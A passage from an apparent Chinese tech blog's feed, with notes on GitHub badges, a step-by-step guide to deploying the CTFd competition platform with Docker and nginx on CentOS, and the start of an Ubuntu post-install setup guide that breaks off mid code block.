将本地仓库和远程仓库进行关联；</p><p>6、其实到这里已经迁移完成，主要是下载到本地，添加Git仓库后，再把项目同步到本地仓库上</p><h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><p><strong>change time:2019-6-29</strong><br>近期为了使用gitbook写电子书，开始重新接触github pages、github badge，也因此不再将本博客托管至github，只托管于coding</p><h3 id="github-pages"><a href="#github-pages" class="headerlink" title="github pages"></a>github pages</h3><p><a href="https://pages.github.com/" target="_blank" rel="noopener">https://pages.github.com/</a><br>感觉教程也很多，没什么细节操作,就不多废话了,需要的时候折腾下，不做开发不是很需要这么规范</p><h3 id="github-badge"><a href="#github-badge" class="headerlink" title="github badge"></a>github badge</h3><p>单纯为了好看的，没用实际用途<br>用一些通用的小图标来描述项目相关信息确实不失为一种很棒的选择</p><p>GitHub 项目的 README.md 中可以添加徽章（Badge）对项目进行标记和说明，这些好看的小图标不仅简洁美观，而且还包含了清晰易读的信息。<br>徽标主要由图片和对应的链接（当然，你可以不填）组成，徽标图片的话一般由左半部分的名称和右半部分的值组成。</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1561791715257.png" alt></p><p>GitHub 徽标的官方网站是 <a href="https://shields.io/" target="_blank" rel="noopener">shields.io</a><br>例如：自定义徽标</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">https://img.shields.io/badge/</span><span class="template-variable">&#123;徽标标题&#125;</span><span class="xml">-</span><span class="template-variable">&#123;徽标内容&#125;</span><span class="xml">-</span><span class="template-variable">&#123;徽标颜色&#125;</span><span class="xml">.svg</span></span><br></pre></td></tr></table></figure><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1561791942639.png" alt></p><h2 id="本文涉及的术语"><a href="#本文涉及的术语" class="headerlink" title="本文涉及的术语"></a>本文涉及的术语</h2><ul><li>Version Control（版本控制）:任何一个能够让你了解文件的历史，以及该文件的发展进程的系统。</li><li>Git：一个版本控制程序，通过对变更进行注释，以创建一个易于遍历的系统历史。</li><li>Commit（提交）：在指定时间点对系统差异进行的注释 “快照”。</li><li>Local（本地）：指任意时刻工作时正在使用的电脑。</li><li>Remote（远程）： 指某个联网的位置。</li><li>Repository (仓库，简称 repo)：配置了Git超级权限的特定文件夹，包含了你的项目或系统相关的所有文件。</li><li>Github：获取本地提交历史记录，并进行远程存储，以便你可以从任何计算机访问这些记录。</li><li>Pushing（推送）：取得本地Git提交（以及相关的所有工作），然后将其上传到在线Github。</li><li>Pulling（拉取）：从在线的Github上获取最新的提交记录，然后合并到本地电脑上。</li><li>Master (branch)：主分支，提交历史 “树”的 “树干”，包含所有已审核的内容/代码。</li><li>Feature branch（功能分支/特性分支）：一个基于主分支的独立的位置，在再次并入到主分支之前，你可以在这里安全地写工作中的新任务。</li><li>Pull Request（发布请求）：一个 Github 工具，允许用户轻松地查看某功能分支的更改 （the difference或 “diff”），同时允许用户在该分支合并到主分支之前对其进行讨论和调整。</li><li>Merging（合并）：该操作指获取功能分支的提交，加入到主分支提交历史的顶部。</li><li>Checking out（切换）：该操作指从一个分支切换到另一个分支。</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;作为一个白帽子，使用github的唯一目的是记录自己的研究项目，存放学习笔记，备份资料等等。对协同开发的需求不大，简单使用Git的几个命令就可以上传本地文件到远程服务器，很多人说很繁琐，喜欢使用GUI版本的github for Desktop,那么这就看个人喜好了~接下来的内容仅适合同我情况差不多的人阅读! &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;详细的学习教程–&amp;gt;&lt;a href=&quot;http://www.runoob.com/git/git-tutorial.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;菜鸟教程 for Git&lt;/a&gt; &lt;/p&gt;
    
    </summary>
    
      <category term="随笔" scheme="http://qymua.com/categories/%E9%9A%8F%E7%AC%94/"/>
    
      <category term="github" scheme="http://qymua.com/categories/%E9%9A%8F%E7%AC%94/github/"/>
    
    
      <category term="Git" scheme="http://qymua.com/tags/Git/"/>
    
      <category term="github" scheme="http://qymua.com/tags/github/"/>
    
  </entry>
  
  <entry>
    <title>CTFd搭建笔记</title>
    <link href="http://qymua.com/2019/04/15/CTFd%E6%90%AD%E5%BB%BA%E7%AC%94%E8%AE%B0/"/>
    <id>http://qymua.com/2019/04/15/CTFd搭建笔记/</id>
    <published>2019-04-14T18:16:49.000Z</published>
    <updated>2019-08-27T13:58:07.000Z</updated>
    
    <content type="html"><![CDATA[<p>其实还有很多其他开源的CTF平台，之所以选择CTFd主要考虑到简便，成本低，DIY几个特性，FBCTF也是个很棒的比赛平台，界面很炫酷，但是资源占用比较大，另外因为被强，部署难度较麻烦，亲测后决定放弃。miniCTF功能不能满足需求。至于想深入了解去CTFd官网巧巧吧！</p><a id="more"></a><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>CTFd是一款基于Apache2.0的协议的开源CTF平台，最新版本目前为2.1.2。该平台功能强大，基本上能够满足目前的CTF竞赛需求，同时，该平台提供了强大的插件功能，可以自己进行插件开发实现自己的功能。</p><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><blockquote><p>本次平台的搭建示例是在本地虚拟机centos 7下完成的，请保证系统环境正常。<strong>如果需要部署在云服务器上，请准备好ssh工具(推荐xshell)道理大体相同，只是最后为了让访问更流畅建议做下优化，文章末尾会做说明！</strong></p></blockquote><h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><h3 id="0-系统环境"><a href="#0-系统环境" class="headerlink" title="0.系统环境"></a>0.系统环境</h3><p>虚拟机的话最好使用桥接，提前排除这个出错的可能性，云服务器可以忽略这一点<br>安利一波系统下载地址，推荐使用国内镜像站下载：</p><p><a href="https://mirrors.tuna.tsinghua.edu.cn/#" target="_blank" rel="noopener">清华大学开源软件镜像站</a></p><p>为了示例我选择mini版本</p><h3 id="1-检查网络环境"><a href="#1-检查网络环境" class="headerlink" title="1.检查网络环境"></a>1.检查网络环境</h3><p>安装成功后建议测试下网络，<code>ip addr</code>没有正常获取地址的话，尝试重启网络服务<code>systemctl restart network</code></p><p>日常redhat系用的少，命令变生疏了（狗头）</p><h3 id="2-终端连接"><a href="#2-终端连接" class="headerlink" title="2.终端连接"></a>2.终端连接</h3><p>其实，<em>CentOS</em> 7安装完成，<em>默认</em>是已经打开了22端口的。自带的<em>SSH</em>服务是<em>OpenSSH</em>中的一个独立守护进程<em>SSHD</em> </p><p>所以可以直接连接，很方便，如果遇到错误可以查阅相关文档</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566909041449.png" alt></p><h3 id="3-yum换源"><a href="#3-yum换源" class="headerlink" title="3.yum换源"></a>3.yum换源</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mv /etc/yum<span class="selector-class">.repos</span><span class="selector-class">.d</span>/CentOS-Base<span class="selector-class">.repo</span> /etc/yum<span class="selector-class">.repos</span><span class="selector-class">.d</span>/CentOS-Base<span class="selector-class">.repo</span><span class="selector-class">.backup</span> </span><br><span class="line">wget -O /etc/yum<span class="selector-class">.repos</span><span class="selector-class">.d</span>/CentOS-Base<span class="selector-class">.repo</span> http:<span class="comment">//mirrors.aliyun.com/repo/Centos-7.repo </span></span><br><span class="line">wget -O /etc/yum<span class="selector-class">.repos</span><span class="selector-class">.d</span>/epel<span class="selector-class">.repo</span> http:<span class="comment">//mirrors.aliyun.com/repo/epel-7.repo</span></span><br><span class="line">yum clean all   </span><br><span class="line">yum makecache</span><br></pre></td></tr></table></figure><h3 id="4-安装git"><a href="#4-安装git" class="headerlink" title="4.安装git"></a>4.安装git</h3><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum <span class="keyword">install</span> git</span><br></pre></td></tr></table></figure><h3 id="5-安装pip"><a href="#5-安装pip" class="headerlink" title="5.安装pip"></a>5.安装pip</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum <span class="keyword">install</span> python-pip</span><br><span class="line">pip <span class="keyword">install</span> <span class="comment">--upgrade pip</span></span><br></pre></td></tr></table></figure><p>pip换源</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir ~/.pip</span><br><span class="line">echo -e "[global]\nindex-url = <span class="link">https://pypi.douban.com/simple/\n</span>[<span class="string">install</span>]\ntrusted-host = pypi.douban.com" &gt;  ~/.pip/pip.conf</span><br></pre></td></tr></table></figure><h3 id="6-安装Docker"><a href="#6-安装Docker" class="headerlink" title="6.安装Docker"></a>6.安装Docker</h3><p>安装需要的软件包</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y yum-utils device-mapper-persistent-data lvm2 bind-utils</span><br></pre></td></tr></table></figure><p>设置yum源</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo</span><br></pre></td></tr></table></figure><p>安装docker</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install docker-ce</span><br></pre></td></tr></table></figure><p>启动并加入开机启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl start docker</span><br><span class="line">systemctl enable docker</span><br></pre></td></tr></table></figure><p>验证是否安装成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker version</span><br></pre></td></tr></table></figure><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566911917029.png" alt></p><h3 id="7-安装docker-compose"><a href="#7-安装docker-compose" class="headerlink" title="7.安装docker-compose"></a>7.安装docker-compose</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum -y install epel-release </span><br><span class="line">pip install docker-compose</span><br></pre></td></tr></table></figure><p>检查docker-compose是否成功安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose -version</span><br></pre></td></tr></table></figure><h2 id="部署阶段"><a href="#部署阶段" class="headerlink" title="部署阶段"></a>部署阶段</h2><h3 id="1-下载CTFd"><a href="#1-下载CTFd" class="headerlink" title="1.下载CTFd"></a>1.下载CTFd</h3><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/CTFd/CTFd.git</span><br><span class="line">chmod -R <span class="number">755</span> CTFd/</span><br></pre></td></tr></table></figure><blockquote><p>vim使用科普–&gt;命令模式下输入/后可以实现类似Ctrl+F的功能搜索文本内容，按n查找下一条，当然你也可以在本地git clone下载CTFd文件先修改后上传</p></blockquote><p>浏览CTFd目录结构，主要关注的是<code>Themes</code>，之后可以DIY主题，如要上传在本地修改好的主题文件</p><p>xshell终端推荐使用<code>lrzsz</code>，<code>sz file</code>：下载；<code>rz</code>：上传</p><p>以及<code>docker-compose.yml</code>，可以对修改部署配置</p><h3 id="2-安装CTFd"><a href="#2-安装CTFd" class="headerlink" title="2.安装CTFd"></a>2.安装CTFd</h3><p>在CTF维基<a href="https://github.com/CTFd/CTFd/wiki/Getting-Started" target="_blank" rel="noopener">https://github.com/CTFd/CTFd/wiki/Getting-Started</a> 中写了详细的安装步骤。</p><p>简易采用第二种方式（docker安装）</p><p><strong>常规方式</strong></p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd CTFd/</span><br><span class="line"><span class="meta"># 安装操作系统需要安装的包</span></span><br><span class="line">./prepare.sh</span><br><span class="line"><span class="meta"># 安装python需要的包</span></span><br><span class="line">pip install -r requirements.txt</span><br><span class="line"><span class="meta"># 运行CTFd</span></span><br><span class="line">python serve.py</span><br></pre></td></tr></table></figure><blockquote><p>接下去会下载很多东西，也就是跑下脚本一键部署平台所需要的环境，如果出现红字报错或者各种依赖问题，可以尝试update或者solo下，每个人情况不一，此类问题自行解决</p></blockquote><p>完成以上步骤只是在本地搭起服务器，要是想在公网（物理机）访问，还需要安装gunicorn<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pip install gunicorn</span><br><span class="line">sudo (gunicorn --bind <span class="number">0.0</span><span class="meta">.0</span><span class="meta">.0</span>:<span class="number">8000</span> -w <span class="number">4</span> <span class="string">"CTFd:create_app()"</span>&amp;)</span><br><span class="line">// 这里加了()还有&amp;是为了那能够后台运行  [<span class="number">0.0</span><span class="meta">.0</span><span class="meta">.0</span>]不用修改</span><br><span class="line">//gunicorn的命令一定要进CTFd目录输入</span><br><span class="line">//访问虚拟机（服务器）公网<span class="built_in">IP</span>即可看见平台</span><br></pre></td></tr></table></figure></p><p>如果你是在虚拟机部署，请切换为NAT连接，在VM虚拟网路编辑器上，将虚拟机的8000端口映射到本机上，即可实现物理机访问，桥接模式即可直接在局域网内共享平台</p><p><strong>docker安装</strong></p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> CTFd/</span><br><span class="line">docker-compose up -<span class="built_in">d</span></span><br></pre></td></tr></table></figure><p>静静等待安装完成</p><p>✔推荐使用docker部署平台,无需苦恼环境问题,直接pull官方提供的依赖环境,搭建后的访问速度明显提升~<br><br><strong>PS：在云服务器搭建，请先在安全组里开放8000端口</strong></p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/006WtDzMgy1g22qi1idssj31f40qfq54.jpg" alt></p><p>如果安装成功不能访问，看下是不是防火墙把端口给过滤掉了。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd <span class="attribute">--zone</span>=public <span class="attribute">--add-port</span>=8000/tcp --permanent</span><br></pre></td></tr></table></figure><h3 id="整站镜像下载（ubuntu）"><a href="#整站镜像下载（ubuntu）" class="headerlink" title="整站镜像下载（ubuntu）"></a>整站镜像下载（ubuntu）</h3><blockquote><p>如果你最终无法成功部署，只是想在本地局域网内使用，可以尝试下载博主搭建好的虚拟机镜像玩一玩，<strong><em>使用前注意重启虚拟机，因为快照是开机状态，NAT地址段可能不一样，需要重新获取</em></strong><br>压缩包密码：<code>qymua.com</code>（平台未进行任何配置和优化）<br>压缩包大小：<strong>3.01G</strong><br>解压后大小：<strong>13G</strong><br>压缩包MD5：<code>ef601c06af91f4c7532cbeaac7b324f0</code></p></blockquote><p><a id="download" href="https://pan.baidu.com/s/1IEQ5xo7BhZmG5jvx993fnA" target="_blank" rel="noopener"><i class="fa fa-download"></i><span> Download Now</span> </a></p><p><code>密码:da8m</code></p><p><strong>注</strong> ：文章已更新，这是很早以前的，我也懒得删了XD</p><h2 id="运维与优化"><a href="#运维与优化" class="headerlink" title="运维与优化"></a>运维与优化</h2><p>CTFd的数据库用的是mariadb，看一下docker运行了哪些容器</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566913239238.png" alt></p><p>可以看到运行了三个容器，分别是ctfd，mariadb，redis。</p><p>我们可以直接进入到各个容器进行操作。</p><p>docker exec -it [CONTAINER ID] /bin/bash</p><p>数据库root账户的密码默认为ctfd</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566913369429.png" alt></p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566913467065.png" alt></p><h3 id="配置Nginx"><a href="#配置Nginx" class="headerlink" title="配置Nginx"></a>配置Nginx</h3><p>如果有需要的话也可以配置一下nginx，这样访问速度会变快，而且作为一个中间件更改端口会更方便(当然小伙伴们选择Apache也是可以的)。 参考链接</p><p><strong>确保所需环境已安装</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">yum <span class="keyword">install</span> gcc-c++</span><br><span class="line">yum <span class="keyword">install</span> -y pcre pcre-devel</span><br><span class="line">yum <span class="keyword">install</span> -y zlib zlib-devel</span><br><span class="line">yum <span class="keyword">install</span> -y openssl openssl-devel</span><br></pre></td></tr></table></figure><p>根目录下新建一个文件夹nginx</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir <span class="string">/nginx</span></span><br><span class="line"><span class="keyword">cd</span> <span class="string">/nginx</span></span><br><span class="line">wget https:<span class="string">//nginx.org/download/nginx-1.14.2.tar.gz</span></span><br><span class="line">tar -zxvf nginx-1.14.2.tar.gz</span><br></pre></td></tr></table></figure><p>然后进入到目录下进行编译</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./configure</span><br><span class="line"><span class="keyword">make</span></span><br><span class="line"><span class="keyword">make</span> install</span><br></pre></td></tr></table></figure><p>查找一下nginx的位置 whereis nginx</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/1566913645892.png" alt></p><p>nginx常见命令</p><p>启动、停止nginx</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> <span class="string">/usr/local/nginx/sbin/</span></span><br><span class="line"><span class="string">./nginx</span></span><br><span class="line"><span class="string">./nginx</span> -s stop</span><br><span class="line"><span class="string">./nginx</span> -s <span class="keyword">quit</span></span><br><span class="line"><span class="string">./nginx</span> -s <span class="keyword">reload</span></span><br><span class="line"><span class="string">./nginx</span> -s <span class="keyword">quit</span>:此方式停止步骤是待nginx进程处理任务完毕进行停止。</span><br><span class="line"><span class="string">./nginx</span> -s stop:此方式相当于先查出nginx进程id再使用kill命令强制杀掉进程。</span><br></pre></td></tr></table></figure><p>nginx开机自启动<br>即在<code>rc.local</code>增加启动代码就可以了。 <code>vi /etc/rc.local</code></p><p>增加一行 <code>/usr/local/nginx/sbin/nginx</code> (根据whereis nginx实际的位置为准)</p><p>设置执行权限：<code>chmod 755 rc.local</code></p><p>配置nginx 配置之前需要先运行一下nginx</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">./nginx</span></span><br><span class="line"><span class="string">./nginx</span> -s <span class="keyword">quit</span></span><br></pre></td></tr></table></figure><p>然后在修改配置文件</p><p>vim /usr/local/nginx/conf/nginx.conf（whereis nginx 实际情况）</p><p>server下的location替换为</p><p><code>server_name</code> 可以换成你想绑定的域名，别忘了DNS添加记录</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">location</span> /&#123;</span><br><span class="line"><span class="attribute">proxy_pass</span> http://localhost:8000;</span><br><span class="line"><span class="attribute">proxy_set_header</span> Host <span class="variable">$host</span>;</span><br><span class="line"><span class="attribute">proxy_set_header</span> X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line"><span class="attribute">proxy_set_header</span> X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line"><span class="attribute">proxy_redirect</span> <span class="literal">off</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后别忘了，云服务器上部署需要在安全组手动开启对外开放的端口</p><blockquote><p>为了方便监控服务器，推荐装个BT面板</p></blockquote><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -<span class="keyword">y</span> wget &amp;&amp; wget -O install.<span class="keyword">sh</span> http://download.bt.<span class="keyword">cn</span>/install/install_6.<span class="number">0</span>.<span class="keyword">sh</span> &amp;&amp; <span class="keyword">sh</span> install.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;其实还有很多其他开源的CTF平台，之所以选择CTFd主要考虑到简便，成本低，DIY几个特性，FBCTF也是个很棒的比赛平台，界面很炫酷，但是资源占用比较大，另外因为被强，部署难度较麻烦，亲测后决定放弃。miniCTF功能不能满足需求。至于想深入了解去CTFd官网巧巧吧！&lt;/p&gt;
    
    </summary>
    
      <category term="随笔" scheme="http://qymua.com/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="docker" scheme="http://qymua.com/tags/docker/"/>
    
      <category term="CTFd" scheme="http://qymua.com/tags/CTFd/"/>
    
  </entry>
  
  <entry>
    <title>ubuntu安装后的初始化配置</title>
    <link href="http://qymua.com/2019/04/12/ubuntu%E5%AE%89%E8%A3%85%E5%90%8E%E7%9A%84%E5%88%9D%E5%A7%8B%E5%8C%96%E9%85%8D%E7%BD%AE/"/>
    <id>http://qymua.com/2019/04/12/ubuntu安装后的初始化配置/</id>
    <published>2019-04-12T15:47:24.000Z</published>
    <updated>2019-08-10T13:13:34.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本篇简单介绍一下，刚装好的Ubuntu系统需要配置的选项及常用软件安装。</p></blockquote><a id="more"></a><h2 id="一、修改默认语言"><a href="#一、修改默认语言" class="headerlink" title="一、修改默认语言"></a>一、修改默认语言</h2><p>system setting -&gt; Lang uage Support</p><p>在弹出的窗口中，将<code>汉语(中国)</code>从最下面拖到第一个，然后重启，就换成中文了。</p><blockquote><p>这里有一个需要注意的地方，再重启进入桌面的时候，会问你“是否将home下的几个文件夹换成中文”，最好不要换，否则以后在命令行进入文件夹的时候，就得写cd 图片，很不方便。</p></blockquote><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/006WtDzMgy1g20f0ce8dpj30zm0j0ag8.jpg" alt></p><p>如果不喜欢用系统自带的pinyin输入法，可以去sougou官网下载deb安装包</p><p>首先需要安装<code>fcitx</code>键盘输入法系统</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1、添加以下源： sudo add-apt-repository ppa:fcitx-team/nightly</span><br><span class="line">2、更新：sudo apt-get <span class="keyword">update</span></span><br><span class="line"><span class="number">3</span>、安装fcitx：sudo apt-<span class="keyword">get</span> <span class="keyword">install</span> fcitx</span><br><span class="line"><span class="number">4</span>、安装fcitx的配置工具：sudo apt-<span class="keyword">get</span> <span class="keyword">install</span> fcitx-config-gtk</span><br><span class="line"><span class="number">5</span>、安装fcitx的<span class="keyword">table</span>-<span class="keyword">all</span>软件包: sudo apt-<span class="keyword">get</span> <span class="keyword">install</span> fcitx-<span class="keyword">table</span>-<span class="keyword">all</span></span><br><span class="line"><span class="number">6</span>、安装im-<span class="keyword">switch</span>切换工具：sudo apt-<span class="keyword">get</span> <span class="keyword">install</span> im-<span class="keyword">switch</span></span><br></pre></td></tr></table></figure><p>安装搜狗输入法</p><p>1、首先到搜狗输入法官网下载搜狗输入法，下载的是个deb文件。<br>搜狗输入法Linux版下载地址：<a href="http://pinyin.sogou.com/linux/?r=pinyin" target="_blank" rel="noopener">http://pinyin.sogou.com/linux/?r=pinyin</a></p><p>2、Ubuntu 16.04安装搜狗输入法命令如下：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">sudo</span> <span class="selector-tag">apt-get</span> <span class="selector-tag">install</span> <span class="selector-tag">-f</span></span><br><span class="line"><span class="selector-tag">sudo</span> <span class="selector-tag">dpkg</span> <span class="selector-tag">-i</span> <span class="selector-tag">sogoupinyin_2</span><span class="selector-class">.0</span><span class="selector-class">.0</span><span class="selector-class">.0072_amd64</span><span class="selector-class">.deb</span></span><br><span class="line"><span class="selector-id">#deb</span>文件名，要和自己下载的版本一致。</span><br></pre></td></tr></table></figure><p>3、安装完毕，设置语言选项<br>到系统设置-&gt;语言支持（System-&gt;Language Support），将键盘输入法系统由默认的iBus设置为fcitx</p><p>4、注销，重新登陆。<br>将键盘输入法系统改为fcitx后，先要注销。之后点击右上角的输入法图标，点击设置，进入设置界面，如果没有看到搜狗输入法，点击左下角的加号，然后注意先要去掉”只显示当前语言的输入法”前面那个勾，然后再搜索”sogo”，这个时候就看到sogo pinyin了，接着添加就可以了。</p><h2 id="二、卸载不必要软件sudo-apt-remove"><a href="#二、卸载不必要软件sudo-apt-remove" class="headerlink" title="二、卸载不必要软件sudo apt remove"></a>二、卸载不必要软件sudo apt remove</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ubuntu-web-launchers    Amazon</span><br><span class="line">aisleriot   纸牌游戏</span><br><span class="line">gnome-mahjongg  麻将游戏</span><br><span class="line">gnome-mines 扫雷游戏</span><br><span class="line">gnome-sudoku    数独游戏</span><br></pre></td></tr></table></figure><h2 id="三、修改软件更新源"><a href="#三、修改软件更新源" class="headerlink" title="三、修改软件更新源"></a>三、修改软件更新源</h2><p>设置 -&gt; 软件和更新 -&gt; 下载自 -&gt; 其他，就会出现下面的第二张图，可以点<code>选择最佳服务器</code>，让系统把所有的源都测试一遍选出一个最好的，或者也可以直接选“清华”或“中科大”或者“阿里”的源，一般这三个速度都很快。</p><p><img src="https://www.github.com/Qymua/bookmaker-data/raw/master/Qymua/006WtDzMgy1g20f17tpj2j316b0kqgse.jpg" alt></p><h2 id="四、系统更新"><a href="#四、系统更新" class="headerlink" title="四、系统更新"></a>四、系统更新</h2><p>打开软件和更新，添加源代码和其他软件，然后重新载入。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt <span class="keyword">update</span>&amp;&amp;sudo apt <span class="keyword">upgrade</span></span><br></pre></td></tr></table></figure><h2 id="五、安装软件"><a href="#五、安装软件" class="headerlink" title="五、安装软件"></a>五、安装软件</h2><h3 id="1-其他软件"><a href="#1-其他软件" class="headerlink" title="1.其他软件"></a>1.其他软件</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># vim</span></span><br><span class="line">sudo apt <span class="keyword">install</span> vim</span><br><span class="line"><span class="comment"># fcitx</span></span><br><span class="line">sudo apt <span class="keyword">install</span> fcitx</span><br><span class="line"><span class="comment"># 下载搜狗输入法安装包并更改可执行权限</span></span><br><span class="line">sudo dpkg -i sogoupinyin_xxx.deb</span><br><span class="line">sudo apt <span class="keyword">install</span> -f</span><br><span class="line"><span class="comment"># chrome</span></span><br><span class="line">sudo wget https://repo.fdzh.org/chrome/google-chrome.list -P /etc/apt/sources.list.d/</span><br><span class="line">wget -q -O - https://dl.google.com/linux/linux_signing_key.pub  | sudo apt-<span class="keyword">key</span> <span class="keyword">add</span> -</span><br><span class="line">sudo apt <span class="keyword">update</span></span><br><span class="line">sudo apt-<span class="keyword">get</span> <span class="keyword">install</span> google-chrome-stable</span><br><span class="line"><span class="comment"># flash</span></span><br><span class="line">sudo apt <span class="keyword">install</span> adobe-flashplugin</span><br><span class="line"><span class="comment"># 优化工具</span></span><br><span class="line">sudo apt isntall gnome-tweak-tool</span><br><span class="line"><span class="comment"># vlc 视频播放工具</span></span><br><span class="line">sudo apt <span class="keyword">install</span> vlc</span><br><span class="line"><span class="comment"># unar 解压缩软件，可以解决乱码问题</span></span><br><span class="line">sudo apt <span class="keyword">install</span> unar</span><br></pre></td></tr></table></figure><h3 id="2-重要软件"><a href="#2-重要软件" class="headerlink" title="2.重要软件"></a>2.重要软件</h3><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 